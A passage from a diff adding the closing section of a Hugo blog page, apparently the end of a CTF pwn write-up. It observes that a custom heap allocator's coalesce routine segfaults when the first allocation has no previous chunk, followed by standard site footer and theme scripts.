+<p>I realized that if the first thing you do after running the binary is submitting a complaint the program would SIGSEGV. That&rsquo;s because <code>pwnyfree</code> always calls <code>coalesce</code> and in turn <code>coalesce</code> tries to get the previous chunk&rsquo;s <code>btag</code>. The thing is that the complaint is the first heap allocation, there is no previous chunk, so the program tries to get the contents of the WORD right before the start of the heap (which is not in mapped memory).</p>
+<p>I learned a really good lesson here: <strong>always try the binary before reading the code!</strong></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://leo1.cc:5555/">leo_something</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+    const images = Array.from(document.querySelectorAll(".post-content img"));
+    images.forEach(img => {
+        mediumZoom(img, {
+            margin: 0,  
+            scrollOffset: 40,  
+            container: null,  
+            template: null,  
+            background: 'rgba(0, 0, 0, 0.8)'
+        });
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
